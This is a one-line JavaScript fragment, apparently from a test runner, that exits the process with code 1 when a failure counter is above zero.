if (_failed > 0) process.exit(1);
